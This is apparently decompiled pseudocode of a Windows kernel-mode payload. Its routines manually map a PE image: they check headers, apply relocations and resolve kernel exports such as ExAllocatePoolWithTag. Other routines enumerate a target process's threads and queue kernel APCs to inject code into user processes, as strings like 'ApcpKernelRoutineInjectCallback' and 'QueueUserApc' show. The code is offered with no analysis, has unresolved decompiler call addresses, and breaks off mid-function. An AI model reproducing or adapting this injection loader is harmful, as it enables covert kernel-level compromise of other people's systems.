// Decompiled Payload Code

// Function: sub_0 at 0x0
// attributes: thunk
__int64 __fastcall sub_0(
        int a1,
        int a2,
        int a3,
        int a4,
        int a5,
        int a6,
        __int64 a7,
        __int64 a8,
        __int64 a9,
        __int64 a10)
{
  return sub_7D0(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10);
}


// Function: sub_10 at 0x10
_BOOL8 __fastcall sub_10(__int64 a1, __int64 a2, __int64 a3)
{
  _BOOL8 result; // rax
  __int64 v4; // rcx

  result = 0LL;
  if ( a3 )
  {
    if ( *(_WORD *)a3 == 23117 )
    {
      v4 = a3 + *(int *)(a3 + 60);
      if ( *(_DWORD *)v4 == 17744 && *(_WORD *)(v4 + 4) == 0x8664 )
        return *(_WORD *)(v4 + 24) == 523;
    }
  }
  return result;
}


// Function: sub_50 at 0x50
__int64 __fastcall sub_50(__int64 a1, __int64 a2, __int64 a3, __int64 *a4)
{
  __int64 v4; // rdx
  __int64 v6; // rax
  __int64 v7; // r10
  __int64 v8; // rcx
  int v9; // eax
  unsigned int *v10; // r8
  unsigned int v11; // edx
  __int64 v12; // rcx
  unsigned __int64 v13; // rax
  _DWORD *v14; // rdx
  _QWORD *v15; // rdx

  v4 = *a4;
  v6 = *(int *)(*a4 + 60);
  v7 = v4 - *(_QWORD *)(v6 + v4 + 48);
  if ( v4 != *(_QWORD *)(v6 + v4 + 48) )
  {
    v8 = *(unsigned int *)(v6 + v4 + 176);
    if ( (_DWORD)v8 )
    {
      if ( *(_DWORD *)(v6 + v4 + 180) )
      {
        v9 = *(_DWORD *)(v4 + v8);
        v10 = (unsigned int *)(v4 + v8);
        v11 = *(_DWORD *)(v4 + v8 + 4);
        if ( v11 + v9 )
        {
          do
          {
            v12 = 0LL;
            v13 = ((unsigned __int64)v11 - 8) >> 1;
            if ( (int)v13 > 0 )
            {
              do
              {
                if ( (*((_WORD *)v10 + v12 + 4) & 0xF000) == 0x3000 )
                {
                  v14 = (_DWORD *)(*a4 + *v10 + (unsigned __int64)(*((_WORD *)v10 + v12 + 4) & 0xFFF));
                  *v14 += v7;
                }
                if ( (*((_WORD *)v10 + v12 + 4) & 0xF000) == 0xA000 )
                {
                  v15 = (_QWORD *)(*a4 + *v10 + (unsigned __int64)(*((_WORD *)v10 + v12 + 4) & 0xFFF));
                  *v15 += v7;
                }
                ++v12;
              }
              while ( v12 < (int)v13 );
            }
            v10 = (unsigned int *)((char *)v10 + v10[1]);
            v11 = v10[1];
          }
          while ( v11 + *v10 );
        }
      }
    }
  }
  return 1LL;
}


// Function: sub_160 at 0x160
__int64 __fastcall sub_160(__int64 a1, __int64 a2, char a3, __int64 a4, unsigned int a5)
{
  unsigned int i; // [rsp+0h] [rbp-18h]

  for ( i = 0; i < a5; ++i )
    *(_BYTE *)(a4 + i) = a3;
  return a4;
}


// Function: sub_1B0 at 0x1B0
unsigned __int64 __fastcall sub_1B0(__int64 a1, __int64 a2, unsigned __int64 a3, unsigned __int64 a4, unsigned int a5)
{
  __int64 v6; // r9
  char *v7; // rdx
  char v8; // al
  unsigned __int64 v10; // rdx
  unsigned __int64 v11; // r10
  char v12; // al

  if ( a3 >= a4 )
  {
    if ( a3 > a4 )
    {
      v10 = a4;
      if ( a5 )
      {
        v11 = a3 - a4;
        do
        {
          v12 = *(_BYTE *)(v11 + v10++);
          --a5;
          *(_BYTE *)(v10 - 1) = v12;
        }
        while ( a5 );
      }
    }
    return a4;
  }
  v6 = a5 + a4 - 1;
  v7 = (char *)(a5 + a3 - 1);
  if ( !a5 )
    return a4;
  do
  {
    v8 = *v7;
    --v6;
    --v7;
    --a5;
    *(_BYTE *)(v6 + 1) = v8;
  }
  while ( a5 );
  return a4;
}


// Function: sub_220 at 0x220
__int64 __fastcall sub_220(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)
{
  __int64 v8; // rax
  __int64 v9; // rcx
  unsigned int v10; // ebx
  __int64 v11; // rsi
  unsigned int *v12; // r10
  __int64 v13; // r9
  unsigned __int8 *v14; // rcx
  __int64 v15; // r8
  unsigned __int8 v16; // dl
  unsigned __int8 v17; // al
  int v18; // ecx

  if ( !a3 )
    return 0LL;
  if ( !a5 )
    return 0LL;
  if ( *(_WORD *)a3 != 23117 )
    return 0LL;
  v8 = *(int *)(a3 + 60);
  if ( *(_DWORD *)(v8 + a3) != 17744 )
    return 0LL;
  v9 = *(unsigned int *)(v8 + a3 + 136);
  if ( !(_DWORD)v9 )
    return 0LL;
  v10 = *(_DWORD *)(a3 + v9 + 24);
  v11 = a3 + v9;
  v12 = (unsigned int *)(a3 + *(unsigned int *)(a3 + v9 + 32));
  v13 = 0LL;
  if ( !v10 )
    return 0LL;
  while ( 1 )
  {
    v14 = (unsigned __int8 *)(*v12 + a3);
    v15 = a5 - (_QWORD)v14;
    while ( 1 )
    {
      v16 = v14[v15];
      v17 = *v14++;
      if ( !v16 )
        break;
      if ( v16 != v17 )
      {
        v18 = v16 - v17;
        goto LABEL_13;
      }
    }
    v18 = -v17;
LABEL_13:
    if ( !v18 )
      return a3
           + *(unsigned int *)(a3
                             + *(unsigned int *)(v11 + 28)
                             + 4LL * *(unsigned __int16 *)(a3 + *(unsigned int *)(v11 + 36) + 2 * v13));
    v13 = (unsigned int)(v13 + 1);
    ++v12;
    if ( (unsigned int)v13 >= v10 )
      return 0LL;
  }
}


// Function: sub_300 at 0x300
__int64 __fastcall sub_300(__int64 a1, __int64 a2, _WORD *a3, __int64 a4)
{
  __int64 v4; // r8
  int v7; // ecx
  _WORD *i; // rax
  _QWORD *v9; // r10
  int v10; // edi
  _QWORD *v11; // r11
  _QWORD *v12; // rsi
  unsigned __int16 *v13; // r8
  unsigned __int16 *v14; // r9
  unsigned __int16 v15; // cx
  unsigned __int16 v16; // dx
  int v17; // edx

  v4 = *(_QWORD *)(a4 + 8);
  if ( !v4 )
    return 0LL;
  v7 = 0;
  for ( i = a3; *i; ++v7 )
    ++i;
  v9 = *(_QWORD **)(v4 + 40);
  v10 = 2 * v7;
  v11 = (_QWORD *)*v9;
  v12 = v9;
  if ( (_QWORD *)*v9 == v9 )
    return 0LL;
  while ( 1 )
  {
    if ( v10 == *((unsigned __int16 *)v9 + 44) )
    {
      v13 = (unsigned __int16 *)v9[12];
      v14 = a3;
      while ( 1 )
      {
        v15 = *v13++;
        if ( (unsigned __int16)(v15 - 65) <= 0x19u )
          v15 += 32;
        v16 = *v14++;
        if ( (unsigned __int16)(v16 - 66) <= 0x17u )
          v16 += 32;
        if ( !v15 )
          break;
        if ( v15 != v16 )
        {
          v17 = v15 - v16;
          goto LABEL_16;
        }
      }
      v17 = -v16;
LABEL_16:
      if ( !v17 )
        return v9[6];
    }
    v9 = v11;
    v11 = (_QWORD *)*v11;
    if ( v11 == v12 )
      return 0LL;
  }
}


// Function: sub_3D0 at 0x3D0
__int64 __fastcall sub_3D0(__int64 a1, __int64 a2, _BYTE *a3, __int64 a4)
{
  __int64 v4; // r8
  int v7; // ecx
  _BYTE *i; // rax
  _QWORD *v9; // r10
  int v10; // edi
  _QWORD *v11; // r11
  _QWORD *v12; // rsi
  unsigned __int8 *v13; // r9
  unsigned __int8 *v14; // r8
  unsigned __int8 v15; // cl
  unsigned __int8 v16; // dl
  int v17; // edx

  v4 = *(_QWORD *)(a4 + 8);
  if ( !v4 )
    return 0LL;
  v7 = 0;
  for ( i = a3; *i; ++v7 )
    ++i;
  v9 = *(_QWORD **)(v4 + 40);
  v10 = 2 * v7;
  v11 = (_QWORD *)*v9;
  v12 = v9;
  if ( (_QWORD *)*v9 == v9 )
    return 0LL;
  while ( 1 )
  {
    if ( v10 == *((unsigned __int16 *)v9 + 44) )
    {
      v13 = (unsigned __int8 *)v9[12];
      v14 = a3;
      while ( 1 )
      {
        v15 = *v14++;
        if ( (unsigned __int8)(v15 - 65) <= 0x19u )
          v15 += 32;
        v16 = *v13;
        v13 += 2;
        if ( (unsigned __int8)(v16 - 66) <= 0x17u )
          v16 += 32;
        if ( !v15 )
          break;
        if ( v15 != v16 )
        {
          v17 = v15 - v16;
          goto LABEL_16;
        }
      }
      v17 = -v16;
LABEL_16:
      if ( !v17 )
        return v9[6];
    }
    v9 = v11;
    v11 = (_QWORD *)*v11;
    if ( v11 == v12 )
      return 0LL;
  }
}


// Function: sub_490 at 0x490
_BOOL8 __fastcall sub_490(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v5; // rax
  __int64 v6; // rsi
  __int64 v8; // rax
  __int64 v9; // rbx
  __int64 v10; // rax
  _DWORD v11[6]; // [rsp+20h] [rbp-20h] BYREF
  __int16 v12; // [rsp+38h] [rbp-8h]

  if ( *(_DWORD *)(a4 + 24) )
    return 1LL;
  v11[0] = 7602286;
  v11[1] = 7536751;
  *(_DWORD *)((char *)&v11[2] + 2) = 7209074;
  v11[4] = 6619182;
  strcpy((char *)&v11[2], "k");
  v11[5] = 6619256;
  strcpy((char *)&v11[3] + 2, "l");
  v12 = 0;
  v5 = sub_300(a4, a2, v11, a4);
  v6 = v5;
  if ( !v5 )
    return 0LL;
  strcpy((char *)v11, "ExAllocatePoolWithTag");
  v8 = sub_220(a4, v5, v5, a4, (__int64)v11);
  v11[0] = 1917220933;
  v9 = v8;
  *(_QWORD *)(a4 + 48) = v8;
  strcpy((char *)&v11[1], "eePoolWithTag");
  v10 = sub_220(a4, v6, v6, a4, (__int64)v11);
  *(_QWORD *)(a4 + 56) = v10;
  if ( !v9 )
    return 0LL;
  return v10 != 0;
}


// Function: sub_5C0 at 0x5C0
__int64 __fastcall sub_5C0(
        __int64 a1,
        int a2,
        __int64 a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        __int64 a9,
        int a10,
        int a11,
        __int64 a12,
        __int64 a13,
        __int64 a14)
{
  if ( a3 )
    return sub_5E2(a4, a3, a3, a4, a5, a6, a7, a8, a2, a10, a11, a12, a13, a14);
  else
    return 0LL;
}


// Function: sub_5E2 at 0x5E2
// positive sp value has been detected, the output may be wrong!
__int64 __fastcall sub_5E2(__int64 a1, unsigned __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rbx
  __int64 result; // rax
  unsigned __int64 v6; // rbp
  unsigned int v7; // r11d
  unsigned int *v8; // rbx
  __int64 v9; // rdi
  __int64 v10; // rax
  unsigned int v11; // r8d
  unsigned __int64 v12; // rcx

  v4 = a3 + *(int *)(a3 + 60);
  if ( *(_DWORD *)(a4 + 24) )
  {
    v6 = *(_QWORD *)(a4 + 32);
  }
  else
  {
    result = (*(__int64 (__fastcall **)(__int64, unsigned __int64, _QWORD, _QWORD, __int64))(a1 + 48))(
               a1,
               a2,
               *(unsigned int *)(v4 + 80),
               0LL,
               1380207699LL);
    v6 = result;
    if ( !result )
      return result;
  }
  *(_QWORD *)a1 = v6;
  sub_1B0(a1, a2, a2, v6, *(_DWORD *)(v4 + 84));
  v7 = *(unsigned __int16 *)(v4 + 6);
  if ( *(_WORD *)(v4 + 6) )
  {
    v8 = (unsigned int *)(v4 + 272);
    v9 = v7;
    do
    {
      v10 = v8[1];
      if ( (_DWORD)v10 )
      {
        v11 = v8[2];
        v12 = v6 + v10;
        if ( v11 )
        {
          sub_1B0(v9, a2, a2 + v8[3], v12, v11);
        }
        else if ( *v8 )
        {
          sub_160(v9, a2, 0, v12, *v8);
        }
      }
      v8 += 10;
      --v9;
    }
    while ( v9 );
  }
  return 1LL;
}


// Function: sub_6A0 at 0x6A0
__int64 __fastcall sub_6A0(__int64 *i, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rdx
  __int64 v6; // rax
  __int64 v7; // r8
  unsigned int v8; // eax
  unsigned int *v9; // rsi
  __int64 v10; // rbp
  __int64 v11; // r13
  __int64 v12; // rcx
  __int64 *v13; // rbx
  __int64 v14; // rcx
  __int64 v15; // r8
  __int64 v16; // rax

  v4 = *(_QWORD *)a4;
  v6 = *(int *)(*(_QWORD *)a4 + 60LL);
  v7 = *(unsigned int *)(v6 + *(_QWORD *)a4 + 144);
  if ( !(_DWORD)v7 || !*(_DWORD *)(v6 + v4 + 148) )
    return 1LL;
  v8 = *(_DWORD *)(v4 + v7 + 12);
  v9 = (unsigned int *)(v4 + v7);
  if ( !v8 )
    return 1LL;
  while ( 1 )
  {
    v10 = *(_QWORD *)a4;
    v11 = sub_3D0((__int64)i, (__int64)v9, (_BYTE *)(*(_QWORD *)a4 + v8), a4);
    if ( !v11 )
      return 0LL;
    v12 = *v9;
    if ( (_DWORD)v12 )
      v13 = (__int64 *)(v10 + v12);
    else
      v13 = (__int64 *)(v10 + v9[4]);
    v14 = *v13;
    for ( i = (__int64 *)(v10 + v9[4]); *v13; v14 = *v13 )
    {
      v15 = v14 < 0 ? (unsigned __int16)v14 : v14 + *(_QWORD *)a4 + 2;
      v16 = sub_220((__int64)i, (__int64)v9, v11, a4, v15);
      if ( !v16 )
        return 0LL;
      ++v13;
      *i++ = v16;
    }
    v8 = v9[8];
    v9 += 5;
    if ( !v8 )
      return 1LL;
  }
}


// Function: sub_7D0 at 0x7D0
__int64 __fastcall sub_7D0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 result; // rax
  BOOL v8; // eax
  int v9; // r8d
  __int64 v10; // r9
  __int64 v11; // rsi
  __int64 v12; // rbx
  __int64 v13; // rdx
  __int64 v14; // rdx
  int v15; // eax
  __int64 v16; // rax
  __int64 v17; // rcx
  int v18; // [rsp+0h] [rbp-60h]
  int v19; // [rsp+8h] [rbp-58h]
  __int64 v20; // [rsp+10h] [rbp-50h]
  int v21; // [rsp+18h] [rbp-48h]
  __int64 v22; // [rsp+20h] [rbp-40h] BYREF
  __int64 v23; // [rsp+28h] [rbp-38h]
  __int64 v24; // [rsp+30h] [rbp-30h]
  __int64 v25; // [rsp+38h] [rbp-28h]
  __int64 v26; // [rsp+40h] [rbp-20h]
  __int64 v27; // [rsp+48h] [rbp-18h]
  __int64 v28; // [rsp+50h] [rbp-10h]
  void (__fastcall *v29)(__int64, __int64, __int64, __int64); // [rsp+58h] [rbp-8h]

  v23 = 0LL;
  v24 = 0LL;
  v25 = 0LL;
  v26 = 0LL;
  v27 = 0LL;
  v28 = 0LL;
  v29 = 0LL;
  v5 = *(_QWORD *)(a4 + 32);
  *(_QWORD *)(a4 + 8) = 0LL;
  v23 = v5;
  v6 = *(_QWORD *)(a4 + 40);
  *(_QWORD *)a4 = 0LL;
  v24 = v6;
  LODWORD(v6) = *(_DWORD *)(a4 + 16);
  v22 = 0LL;
  LODWORD(v25) = v6;
  v26 = *(_QWORD *)(a4 + 20);
  LODWORD(v27) = *(_DWORD *)(a4 + 28);
  result = sub_490(a4, a2, a3, (__int64)&v22);
  if ( !(_DWORD)result )
  {
    *(_DWORD *)a4 = 0;
    *(_DWORD *)(a4 + 4) = 2;
    *(_QWORD *)(a4 + 8) = 0LL;
    return result;
  }
  v8 = sub_10(a4, a2, *(unsigned int *)(a4 + 48) + a4 + 52);
  v11 = v8;
  if ( !v8 )
  {
    v12 = v22;
    *(_DWORD *)(a4 + 4) = 1;
LABEL_18:
    if ( (_DWORD)v25 || !v12 )
      sub_160(a4, v11, 0, v12, v27);
    else
      v29(a4, v11, 1380207699LL, v12);
    return (unsigned int)v11;
  }
  if ( !(unsigned int)sub_5C0(a4, v8, v10, (int)&v22, v9, v10, v18, v19, v20, v21, v22, v23, v24, v25) )
  {
    v12 = v22;
    *(_DWORD *)(a4 + 4) = 3;
LABEL_17:
    v11 = 0LL;
    goto LABEL_18;
  }
  if ( !(unsigned int)sub_6A0((__int64 *)a4, v11, v13, (__int64)&v22) )
  {
    v12 = v22;
    *(_DWORD *)(a4 + 4) = 4;
    goto LABEL_17;
  }
  v15 = sub_50(a4, v11, v14, &v22);
  v12 = v22;
  if ( !v15 )
  {
    *(_DWORD *)(a4 + 4) = 5;
    goto LABEL_17;
  }
  v16 = *(_QWORD *)(*(int *)(v22 + 60) + v22 + 216);
  if ( (_DWORD)v16 )
    **(_QWORD **)((unsigned int)v16 + v22 + 88) = v22 & 0xFFFFFFFFFFFFLL;
  v17 = *(unsigned int *)(*(int *)(v12 + 60) + v12 + 40);
  if ( !(_DWORD)v17 || ((int (__fastcall *)(__int64, __int64, __int64, __int64))(v12 + v17))(a4, v11, v24, v23) < 0 )
  {
    *(_DWORD *)(a4 + 4) = 7;
    goto LABEL_17;
  }
  sub_160(a4, v11, 0, v12, *(_DWORD *)(*(int *)(v12 + 60) + v12 + 84));
  LODWORD(v11) = 1;
  *(_QWORD *)(a4 + 8) = v12;
  *(_QWORD *)a4 = 1LL;
  return (unsigned int)v11;
}


// Function: sub_DB0 at 0xDB0
void __fastcall sub_DB0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rcx
  __int64 v4; // rdx

  nullsub_1(a1, a2, a3, "ApcpKernelRoutineAlertThreadCallback");
  LOBYTE(v3) = 1;
  MEMORY[0xC2D1A0000300B](a1, a2, v4, v3);
  JUMPOUT(0x13640F06530602LL);
}


// Function: sub_DE4 at 0xDE4
void __fastcall sub_DE4(__int64 a1, __int64 a2, _QWORD *a3, __int64 a4, __int64 a5, __int64 a6, __int64 a7, __int64 a8)
{
  __int64 v11; // rdx

  nullsub_1(a4, a5, a3, "ApcpKernelRoutineInjectCallback");
  if ( (unsigned __int8)MEMORY[0x5002300360047005](a4, a5, v11, __readgsqword(0x188u)) )
    *a3 = 0LL;
  if ( MEMORY[0x600C700DE00F4213]() )
    MEMORY[0x700BD20F0012340F](a4, a5, a3, a5);
  JUMPOUT(0x13640F06530602LL);
}


// Function: sub_E54 at 0xE54
__int64 __fastcall sub_E54(
        __int64 a1,
        __int64 a2,
        _QWORD *a3,
        __int64 a4,
        __int64 a5,
        __int64 a6,
        __int64 a7,
        unsigned int *a8,
        __int64 a9,
        __int64 a10)
{
  __int64 v10; // rbp
  __int64 v13; // rdx
  __int64 v14; // rax
  __int64 v15; // rbp
  int v16; // r9d
  __int64 result; // rax
  __int64 v18; // rdx
  unsigned int *v19; // rbx
  __int64 v20; // rax
  __int64 v21; // rsi
  bool v22; // r15
  __int64 i; // rbp
  __int64 v24; // r14
  int v25; // eax
  __int64 v26; // rdx
  __int64 v27; // rdx

  a10 = v10;
  if ( !a3 || !a4 )
    return 3221225485LL;
  nullsub_1(a3, a4, a3, "LookupProcessThread start");
  v14 = MEMORY[0xC007E009F00BF215](a3, a4, v13, a4);
  a8 = 0LL;
  a9 = 0LL;
  v15 = v14;
  result = sub_40B4((_DWORD)a3, a4, (unsigned int)&a8, 5, (unsigned int)&a9, v16);
  if ( (int)result >= 0 )
  {
    v19 = a8;
    while ( *((_QWORD *)v19 + 10) != v15 )
    {
      v19 = (unsigned int *)((char *)v19 + *v19);
      if ( !*v19 )
        return result;
    }
    v20 = MEMORY[0x600160600071302](a3, a4, v18, a4);
    v21 = 3221226021LL;
    v22 = v20 != 0;
    for ( i = 0LL; (unsigned int)i < v19[1]; i = (unsigned int)(i + 1) )
    {
      v24 = *(_QWORD *)&v19[20 * i + 76];
      if ( v24 != MEMORY[0x600160B000A1502](a3, v21) )
      {
        v25 = MEMORY[0x600160800060A02](a3, v21, a3, v24);
        v21 = (unsigned int)v25;
        if ( v25 >= 0 )
        {
          if ( !*a3 )
            break;
          LOBYTE(v26) = v22;
          if ( !(unsigned __int8)sub_1124(a3, (unsigned int)v25, v26) )
            break;
          MEMORY[0x60000077C4](a3, v21, v27, *a3);
          *a3 = 0LL;
        }
      }
    }
    if ( a8 )
      sub_3B98(a3, v21);
    if ( !*a3 )
      v21 = 3221226021LL;
    nullsub_1(a3, v21, (unsigned int)v21, "LookupProcessThread");
    return (unsigned int)v21;
  }
  return result;
}


// Function: sub_F9C at 0xF9C
__int64 __fastcall sub_F9C(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        __int64 a5,
        __int64 a6,
        __int64 a7,
        __int64 a8,
        __int64 a9,
        __int64 a10,
        __int64 a11)
{
  __int64 v12; // rsi
  unsigned int v13; // ebx
  __int64 v15; // rdi
  __int64 v16; // rax
  __int64 v17; // rbp
  __int64 v18; // rdx
  __int64 v19; // rdx

  v12 = a4;
  v13 = -1073741823;
  if ( !a4 )
    return 3221225485LL;
  nullsub_1(a1, a4, a3, "QueueUserApc start");
  v15 = MEMORY[0x81E1A50023003](a1, v12, 88LL, 0LL, 1598246977LL);
  v16 = MEMORY[0x81E1A50023003](v15, v12, 88LL, 0LL, 1598246977LL);
  v17 = v16;
  if ( v16 && v15 )
  {
    MEMORY[0x57011C0600160D](v15, v12, v12, v16, 0LL, sub_DE4);
    MEMORY[0x57011C0600160D](v15, v12, v12, v15, 0LL, sub_DB0);
    if ( (unsigned __int8)MEMORY[0xC007D009E00BF00D](v15, v12, a6, v17, a11, 0LL) )
    {
      if ( (unsigned __int8)MEMORY[0xC007D009E00BF00D](v15, v12, 0LL, v15, 0LL, 0LL) )
      {
        nullsub_1(v15, v12, v18, "KeInsertQueueApc2");
        v13 = (unsigned __int8)MEMORY[0x5002300360047005](v15, v12, v19, v12) != 0 ? 0xC000004B : 0;
LABEL_11:
        nullsub_1(v15, v12, v13, "QueueUserApc end");
        return v13;
      }
    }
    else
    {
      v12 = 1598246977LL;
      MEMORY[0x13640F06530602](v15, 1598246977LL, 1598246977LL, v17);
    }
    MEMORY[0x13640F06530602](v15, v12, 1598246977LL, v15);
    goto LABEL_11;
  }
  return 3221225495LL;
}


// Function: sub_1124 at 0x1124
bool __fastcall sub_1124(__int64 a1, __int64 a2, char a3)
{
  __int64 v4; // rax

  v4 = MEMORY[0x7006320A0006340A]();
  if ( v4 && !*(_QWORD *)(v4 + 120) )
  {
    if ( a3 )
    {
      if ( *(_DWORD *)(v4 + 8616) && *(_DWORD *)(v4 + 8236) )
        return 0;
    }
    else if ( *(_QWORD *)(v4 + 712) )
    {
      return *(_QWORD *)(v4 + 88) == 0LL;
    }
  }
  return 1;
}


// Function: sub_1174 at 0x1174
void sub_1174()
{
  JUMPOUT(0x6001602000B2F1ALL);
}


// Function: nullsub_1 at 0x1184
void nullsub_1()
{
  ;
}


// Function: sub_1188 at 0x1188
__int64 __fastcall sub_1188(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v6; // rsi
  int v7; // eax
  int v8; // edx
  int v9; // r8d
  int v10; // r9d
  __int64 v12; // rdx
  int v13; // r8d
  int v14; // r9d
  unsigned int v15; // ebx
  __int64 v16; // rax
  int v17; // r8d
  int v18; // r9d
  unsigned int v19; // eax
  __int64 v20; // [rsp+0h] [rbp-78h]
  __int64 v21; // [rsp+8h] [rbp-70h]
  __int64 v22; // [rsp+20h] [rbp-58h] BYREF
  __int64 v23; // [rsp+28h] [rbp-50h] BYREF
  _BYTE v24[48]; // [rsp+30h] [rbp-48h] BYREF

  v6 = MEMORY[0x600160600071302](a4, a2, a3, a3);
  v7 = MEMORY[0x8120200004204](a4, v6);
  if ( (unsigned __int8)sub_3B6C(a4, v6, v8, v7, v9, v10) )
    return 3221225738LL;
  MEMORY[0x500BB212000E3412](a4, v6, v24, a3);
  if ( v6 )
  {
    v22 = 0LL;
  }
  else
  {
    v16 = sub_13D0(a4, 0, v12, a4, v13, v14);
    v22 = v16;
    if ( v16 )
    {
      if ( *(_DWORD *)(a4 + 128) )
        v19 = sub_1728(a4, 0, v12, v16, v17, v18, v20, v21);
      else
        v19 = sub_126C(a4, 0, a3, v16, v17, v18, v20, v21);
      v23 = 0LL;
      v15 = v19;
      MEMORY[0x700B520F0008340F](a4, 0LL, &v22, -1LL, &v23, 0x8000LL);
      goto LABEL_6;
    }
  }
  v15 = -1073741801;
LABEL_6:
  MEMORY[0x600160100030402](a4, v6, v12, v24);
  return v15;
}


// Function: sub_126C at 0x126C
__int64 __fastcall sub_126C(
        _DWORD a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        _DWORD a5,
        _DWORD a6,
        __int64 a7,
        __int64 a8,
        __int64 a9,
        __int64 a10)
{
  __int64 v12; // r8
  __int64 v13; // r9
  signed int v14; // ebx
  __int64 v15; // rsi
  int v16; // eax
  int v17; // edx
  int v18; // r8d
  int v19; // r9d
  __int64 v20; // rdx
  __int64 v22; // [rsp+0h] [rbp-38h]
  __int64 v23; // [rsp+0h] [rbp-38h]
  unsigned int *v24; // [rsp+8h] [rbp-30h]
  __int64 v25; // [rsp+8h] [rbp-30h]
  __int64 v26; // [rsp+10h] [rbp-28h]
  __int64 v27; // [rsp+10h] [rbp-28h]
  __int64 v28; // [rsp+18h] [rbp-20h]
  __int64 v29; // [rsp+18h] [rbp-20h]

  a9 = 0LL;
  nullsub_1();
  v14 = sub_E54(a4, a2, &a9, a3, v12, v13, v22, v24, v26, v28);
  if ( v14 >= 0 )
  {
    v14 = sub_F9C(a4, a2, a4 + 24, a9, 0LL, 0LL, v23, v25, v27, v29, 0LL);
    if ( v14 >= 0 )
    {
      a10 = -50000LL;
      v15 = 0LL;
      while ( 1 )
      {
        v16 = MEMORY[0x8120200004204](a4, v15);
        if ( (unsigned __int8)sub_3B6C(a4, v15, v17, v16, v18, v19)
          || (unsigned __int8)MEMORY[0x5002300360047005](a4, v15, v20, a9) )
        {
          break;
        }
        if ( *(_DWORD *)(a4 + 8) != 1216605224 )
        {
          v14 = MEMORY[0x600160100030402](a4, v15, 0LL, 0LL, &a10);
          if ( v14 < 0 )
            goto LABEL_11;
          v15 = (unsigned int)(v15 + 1);
          if ( (unsigned int)v15 < 0x2710 )
            continue;
        }
        v14 = *(_DWORD *)(a4 + 12) == 0 ? 0xC0000135 : 0;
        goto LABEL_11;
      }
      v14 = -1073741558;
LABEL_11:
      nullsub_1();
      nullsub_1();
    }
    if ( a9 )
      MEMORY[0x60000077C4]();
  }
  nullsub_1();
  return (unsigned int)v14;
}


// Function: sub_1388 at 0x1388
void __fastcall sub_1388(__int64 a1, __int64 a2, int a3, __int64 a4, int a5, int a6, __int64 a7)
{
  int v8; // edx
  int v9; // r8d
  int v10; // r9d
  __int64 v11; // rdx
  int v12; // [rsp+0h] [rbp-28h]

  sub_3BA4(a4, a2, a3, 60000, a5, a6);
  nullsub_1();
  sub_14EC(a4, a2, v8, a4, v9, v10, v12);
  sub_1B84(a4, a2, v11, a4);
  JUMPOUT(0xD331A00000500LL);
}


// Function: sub_13D0 at 0x13D0
__int64 __fastcall sub_13D0(
        __int64 a1,
        __int64 a2,
        _DWORD a3,
        __int64 a4,
        _DWORD a5,
        _DWORD a6,
        __int64 a7,
        __int64 a8)
{
  __int64 v8; // rax

  v8 = *(unsigned int *)(a4 + 140);
  a7 = 0LL;
  a8 = v8 + 24;
  if ( (int)MEMORY[0x9540F06001602](a1, a2, &a7, -1LL, 0LL, &a8) < 0 )
    return 0LL;
  sub_7830(a1, a2, a4 + 144, a7 + 24, *(unsigned int *)(a4 + 140));
  *(_QWORD *)(a7 + 26) = a7;
  *(_DWORD *)(a7 + 20) = *(_DWORD *)(a4 + 132);
  return a7;
}


// Function: sub_145C at 0x145C
__int64 __fastcall sub_145C(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        __int64 a5,
        __int64 a6,
        int a7,
        int a8,
        int a9,
        __int64 a10)
{
  int v10; // ebx
  _QWORD v12[3]; // [rsp+40h] [rbp-18h] BYREF

  a10 = 0LL;
  a9 = 0;
  v10 = sub_1898(a1, a2, L"Parameters1", a3, &a10, &a9);
  if ( v10 >= 0 )
  {
    v12[0] = 0LL;
    v10 = MEMORY[0x77C400005010](a1, a2, 0x1FFFFFLL, v12, 0LL, 0LL);
    if ( v12[0] )
      MEMORY[0x6B6422006C7422]();
  }
  else
  {
    nullsub_1();
  }
  return (unsigned int)v10;
}


// Function: sub_14EC at 0x14EC
__int64 __fastcall sub_14EC(
        int a1,
        __int64 a2,
        _DWORD a3,
        __int64 a4,
        _DWORD a5,
        int a6,
        int a7,
        int a8,
        int a9,
        __int64 a10)
{
  __int64 result; // rax
  __int64 v12; // rdi
  __int64 v13; // r8
  __int64 v14; // r15
  unsigned int *v15; // rbx
  int v16; // eax
  __int64 v17; // rdx
  int v18; // eax
  __int64 v19; // rdx
  int v20; // eax
  __int64 v21; // rdx
  unsigned int v22; // eax
  __int64 v23; // rdx
  __int64 v24; // r8
  unsigned int v25; // eax
  __int64 v26; // rdx
  __int64 v27; // rdx
  unsigned int *v28; // [rsp+30h] [rbp-50h] BYREF
  __int64 v29; // [rsp+38h] [rbp-48h] BYREF
  __int64 v30; // [rsp+40h] [rbp-40h] BYREF
  _BYTE v31[8]; // [rsp+48h] [rbp-38h] BYREF
  _QWORD v32[2]; // [rsp+50h] [rbp-30h] BYREF
  _BYTE v33[16]; // [rsp+60h] [rbp-20h] BYREF
  _BYTE v34[16]; // [rsp+70h] [rbp-10h] BYREF

  v28 = 0LL;
  v30 = 0LL;
  if ( !a4 )
    return 3221225485LL;
  result = sub_40B4(a1, a2, (unsigned int)&v28, 5, (unsigned int)&v30, a6);
  v12 = (unsigned int)result;
  if ( (int)result >= 0 )
  {
    MEMORY[0x5002300360047005]((unsigned int)result, a2, a4, v33);
    a10 = 0LL;
    a7 = 128;
    v29 = 0LL;
    v14 = MEMORY[0x81E1A50023003](v12, a2, 128LL, 0LL, 1279479873LL);
    if ( !v14 )
    {
      if ( v28 )
        sub_3B98(v12, a2);
      return 3221225495LL;
    }
    v15 = v28;
    v32[0] = 0LL;
    WORD1(v32[0]) = a7;
    v32[1] = v14;
    if ( !*v28 )
      goto LABEL_25;
    while ( 1 )
    {
      if ( !*((_WORD *)v15 + 28) )
        goto LABEL_21;
      LOBYTE(v13) = 1;
      if ( (unsigned int)MEMORY[0x2A0000077C4](v12, a2, v33, v15 + 14, v13) )
        goto LABEL_21;
